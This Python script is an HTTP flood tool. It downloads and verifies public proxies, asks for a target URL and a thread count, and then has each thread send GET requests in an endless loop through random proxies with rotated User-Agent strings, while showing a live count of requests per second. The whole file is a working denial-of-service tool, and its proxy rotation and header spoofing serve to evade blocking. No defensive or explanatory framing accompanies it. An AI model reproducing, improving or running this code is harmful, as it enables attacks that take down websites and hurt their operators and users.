import threading
import requests
import time
import random
import concurrent.futures
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import track

threads = []
header = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.110 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.110 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.110 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; yie8)"
]

console = Console()

def check_proxy(proxy):
    try:
        response = requests.get("https://google.com", proxies={"http": proxy, "https": proxy}, timeout=2)
        if response.status_code == 200:
            return True
        else:
            return False
    except Exception:
        return False

def load_proxies(url="https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt"):
    proxies = []
    console.print("Uploading proxy")
    try:
        response = requests.get(url, headers={'User-Agent': 'Mozilla/5.0'})
        response.raise_for_status()
        proxy_list = response.text.splitlines()
        proxy_list = proxy_list[:1000]
        with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
            futures = {executor.submit(check_proxy, proxy): proxy for proxy in proxy_list}
            for future in track(concurrent.futures.as_completed(futures), description="Proxy verification"):
                proxy = futures[future]
                if future.result():
                    proxies.append(proxy)
        console.print("Proxies successfully uploaded and verified! ")
        time.sleep(2)
        return proxies
    except Exception as e:
        console.print(f"Error loading proxies: {e}")
        return proxies



request_count = 0
start_time = time.time()

console = Console()


error_log = open("errors.log", "a") 

def get(url, i):
    global request_count
    while True:
        proxy = {'http': f'http://{random.choice(proxiess)}'}
        head = random.choice(header)
        try:
            response = requests.get(url, proxies=proxy, headers={'User-Agent': head})
            request_count += 1
        except Exception as e:
            error_log.write(f"Error: {e}n")

def update_stats():
    console.clear()
    global request_count, start_time
    elapsed_time = time.time() - start_time
    requests_per_second = request_count / elapsed_time

    table = Table(title="Statistics")
    table.add_column("Requests", justify="right", style="cyan", no_wrap=True)
    table.add_column("Speed (request/s) ", justify="right", style="magenta", no_wrap=True)
    table.add_column("Proxy", justify="right", style="green", no_wrap=True)
    table.add_row(str(request_count), f"{requests_per_second:.2f}", str(len(proxiess)))
    
    console.print(table)

    

if True:
    url = str(input("URL:"))
    th = int(input("Flows:"))
    proxiess = load_proxies()
    for i in range(th):
        thread = threading.Thread(target=get, args=(url, i,))
        threads.append(thread)
        thread.start()

    while True:
        update_stats()
        time.sleep(1)
